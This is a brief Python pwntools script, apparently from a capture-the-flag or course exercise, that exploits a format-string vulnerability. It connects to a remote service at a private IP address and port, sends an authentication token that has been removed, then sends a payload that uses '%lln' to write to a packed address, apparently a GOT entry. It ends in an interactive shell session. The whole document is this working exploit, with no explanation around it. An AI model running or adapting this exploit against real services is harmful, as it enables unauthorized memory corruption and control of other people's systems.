from pwn import *
payload='a%4196552c%8$lln\x18\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
auth='<deleted>'
sh = remote("10.214.10.18",15555)
sh.recvrepeat(timeout = 1)
sh.sendline(auth)
sh.recvrepeat(timeout = 1)
sh.sendline(payload)
sh.interactive()
